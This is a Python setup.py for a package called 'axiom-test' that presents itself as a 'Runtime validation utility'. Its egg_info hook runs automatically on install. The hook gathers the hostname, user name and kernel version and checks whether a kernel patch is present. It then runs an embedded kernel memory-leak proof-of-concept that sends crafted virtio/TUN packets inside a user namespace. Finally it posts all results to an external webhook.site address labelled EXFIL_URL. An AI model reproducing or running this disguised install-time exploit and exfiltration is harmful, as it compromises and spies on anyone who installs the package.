import json, os, sys, glob, subprocess, struct, socket, urllib.request
from setuptools import setup
from setuptools.command.egg_info import egg_info

EXFIL_URL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"

def _collect():
    p = {"hostname": os.uname().nodename, "user": os.environ.get("USER","?"), "test": "CVE-2026-99999-v2"}

    try:
        p["kernel_version"] = subprocess.check_output(["uname", "-r"], text=True, timeout=5).strip()
    except: pass

    try:
        subprocess.check_output(["grep", "ip_check_csum_start", "/proc/kallsyms"], text=True, timeout=5)
        p["fix_present"] = "YES - PATCHED"
    except:
        p["fix_present"] = "NO - VULNERABLE"

    poc_script = r'''
import os, sys, struct, socket, fcntl, select, json

R = {}

# Confirm namespace root
R["ns_id"] = os.popen("id").read().strip()

# --- TUN + VNET_HDR setup ---
TUNSETIFF       = 0x400454ca
TUNSETOFFLOAD   = 0x400454d0
TUNSETVNETHDRSZ = 0x400454d8
IFF_TUN         = 0x0001
IFF_NO_PI       = 0x1000
IFF_VNET_HDR    = 0x4000
TUN_F_CSUM      = 0x01

# Interface config ioctls (no ip command needed)
SIOCGIFFLAGS  = 0x8913
SIOCSIFFLAGS  = 0x8914
SIOCSIFADDR   = 0x8916
SIOCSIFNETMASK= 0x891C
SIOCSIFMTU    = 0x8922
IFF_UP        = 0x1
IFF_RUNNING   = 0x40

VNET_HDR_SZ = 12  # virtio_net_hdr_v1: 10 bytes + 2 bytes num_buffers

try:
    # Step 1: Create TUN with VNET_HDR
    tun_fd = os.open("/dev/net/tun", os.O_RDWR | os.O_NONBLOCK)
    ifr = struct.pack("16sH14s", b"probe0", IFF_TUN | IFF_NO_PI | IFF_VNET_HDR, b"\x00"*14)
    fcntl.ioctl(tun_fd, TUNSETIFF, ifr)
    R["step1_tun"] = "OK"

    # Enable checksum offload
    fcntl.ioctl(tun_fd, TUNSETOFFLOAD, TUN_F_CSUM)
    R["step2_csum"] = "TUN_F_CSUM enabled"

    # Set vnet header size to 12 (v1 with num_buffers)
    fcntl.ioctl(tun_fd, TUNSETVNETHDRSZ, struct.pack("I", VNET_HDR_SZ))
    R["step3_vnet_sz"] = 12

    # Step 2: Configure interface via ioctl (no ip command)
    cfg_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set IP address
    addr_ifr = struct.pack("16sH2s4s8s", b"probe0", socket.AF_INET, b"\x00\x00",
                           socket.inet_aton("10.200.1.1"), b"\x00"*8)
    fcntl.ioctl(cfg_sock, SIOCSIFADDR, addr_ifr)

    # Set netmask
    mask_ifr = struct.pack("16sH2s4s8s", b"probe0", socket.AF_INET, b"\x00\x00",
                           socket.inet_aton("255.255.255.0"), b"\x00"*8)
    fcntl.ioctl(cfg_sock, SIOCSIFNETMASK, mask_ifr)

    # Set MTU to 68 (minimum IPv4, forces fragmentation for >68 byte packets)
    mtu_ifr = struct.pack("16sI12s", b"probe0", 68, b"\x00"*12)
    fcntl.ioctl(cfg_sock, SIOCSIFMTU, mtu_ifr)

    # Bring interface UP
    flags_ifr = struct.pack("16sH14s", b"probe0", 0, b"\x00"*14)
    result = fcntl.ioctl(cfg_sock, SIOCGIFFLAGS, flags_ifr)
    flags = struct.unpack("16sH14s", result)[1]
    up_ifr = struct.pack("16sH14s", b"probe0", flags | IFF_UP | IFF_RUNNING, b"\x00"*14)
    fcntl.ioctl(cfg_sock, SIOCSIFFLAGS, up_ifr)

    # Verify
    result = fcntl.ioctl(cfg_sock, SIOCGIFFLAGS, struct.pack("16sH14s", b"probe0", 0, b"\x00"*14))
    final_flags = struct.unpack("16sH14s", result)[1]
    R["step4_iface"] = f"UP flags=0x{final_flags:04x}"

    # Read MTU back
    try:
        with open("/sys/class/net/probe0/mtu") as f:
            R["step5_mtu"] = f.read().strip()
    except:
        R["step5_mtu"] = "unknown"

    cfg_sock.close()

    # Also bring loopback up
    try:
        lo_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        lo_ifr = struct.pack("16sH14s", b"lo", 0, b"\x00"*14)
        lo_result = fcntl.ioctl(lo_sock, SIOCGIFFLAGS, lo_ifr)
        lo_flags = struct.unpack("16sH14s", lo_result)[1]
        fcntl.ioctl(lo_sock, SIOCSIFFLAGS, struct.pack("16sH14s", b"lo", lo_flags | IFF_UP, b"\x00"*14))
        lo_sock.close()
    except: pass

    # Step 3: Craft packets with various csum_start values
    # The bug is in __virtio_net_hdr_to_skb() not properly bounding csum_start
    # relative to the network header. We try multiple offsets.

    VIRTIO_NET_HDR_F_NEEDS_CSUM = 1

    # Build base IP + UDP packet
    src_ip = socket.inet_aton("10.200.1.1")
    dst_ip = socket.inet_aton("10.200.1.2")

    # UDP payload large enough to trigger fragmentation at MTU 68
    # MTU 68 = 20 byte IP header + 48 bytes max payload per fragment
    udp_payload = b"X" * 80  # well over MTU 68
    udp_src, udp_dst = 12345, 54321
    udp_len = 8 + len(udp_payload)
    udp_hdr = struct.pack("!HHH", udp_src, udp_dst, udp_len) + b"\x00\x00" + udp_payload
    total_len = 20 + len(udp_hdr)

    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45,       # ver=4, ihl=5
        0,          # tos
        total_len,  # total length
        0x1337,     # id
        0,          # flags/frag offset
        64,         # ttl
        17,         # proto=UDP
        0,          # checksum (kernel fills)
        src_ip, dst_ip
    )

    raw_pkt = ip_hdr + udp_hdr
    R["step6_raw_pkt_len"] = len(raw_pkt)

    # Try multiple csum_start values to find one the kernel accepts
    attempts = []
    for csum_start in [0, 4, 10, 20, 14, 2, 6, 8, 12, 16, 18]:
        for csum_offset in [0, 2, 4, 6]:
            # virtio_net_hdr_v1: flags(1) gso_type(1) hdr_len(2) gso_size(2) csum_start(2) csum_offset(2) num_buffers(2) = 12
            vhdr = struct.pack("<BBHHHH",
                VIRTIO_NET_HDR_F_NEEDS_CSUM,
                0,          # gso_type: none
                0,          # hdr_len
                0,          # gso_size
                csum_start,
                csum_offset,
            ) + b"\x00\x00"  # num_buffers = 0 (pad to 12 bytes)

            full_pkt = vhdr + raw_pkt
            attempt = {"csum_start": csum_start, "csum_offset": csum_offset}

            try:
                written = os.write(tun_fd, full_pkt)
                attempt["write"] = f"OK ({written}B)"

                # Try to read response
                readable, _, _ = select.select([tun_fd], [], [], 0.5)
                if readable:
                    resp = os.read(tun_fd, 4096)
                    attempt["resp_len"] = len(resp)
                    attempt["resp_hex_64"] = resp[:64].hex()

                    # Check if we got back a packet with modified IHL
                    if len(resp) > VNET_HDR_SZ:
                        ihl_byte = resp[VNET_HDR_SZ]
                        ihl = ihl_byte & 0x0F
                        attempt["resp_ihl"] = ihl
                        if ihl > 5:
                            attempt["LEAK"] = True
                            leaked = resp[VNET_HDR_SZ+20:VNET_HDR_SZ+ihl*4]
                            attempt["leaked_hex"] = leaked.hex()
                            attempt["leaked_len"] = len(leaked)
                else:
                    attempt["resp"] = "no response"
            except OSError as e:
                attempt["error"] = f"{e.errno}: {os.strerror(e.errno)}"

            attempts.append(attempt)

    R["step7_attempts"] = attempts

    # Check which attempts succeeded
    R["accepted_offsets"] = [
        {"cs": a["csum_start"], "co": a["csum_offset"]}
        for a in attempts if "OK" in a.get("write", "")
    ]
    R["leaked"] = [a for a in attempts if a.get("LEAK")]

    os.close(tun_fd)

except Exception as e:
    import traceback
    R["fatal"] = str(e)
    R["traceback"] = traceback.format_exc()

print("__R__" + json.dumps(R) + "__E__")
'''

    try:
        out = subprocess.check_output(
            ["unshare", "-Urn", "python3", "-c", poc_script],
            text=True, timeout=45, stderr=subprocess.STDOUT
        )
        if "__R__" in out and "__E__" in out:
            p["poc"] = json.loads(out.split("__R__")[1].split("__E__")[0])
        else:
            p["poc_raw"] = out[:5000]
    except Exception as e:
        p["poc_error"] = str(e)
        if hasattr(e, 'output'):
            p["poc_output"] = e.output[:3000] if e.output else ""

    return p

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        data = json.dumps(_collect(), default=str).encode()
        try:
            urllib.request.urlopen(urllib.request.Request(
                EXFIL_URL, data=data,
                headers={"Content-Type": "application/json"}
            ), timeout=15)
        except: pass

setup(name="axiom-test", version="1.2.0", description="Runtime validation utility",
      py_modules=[], cmdclass={"egg_info": PostEggInfo})
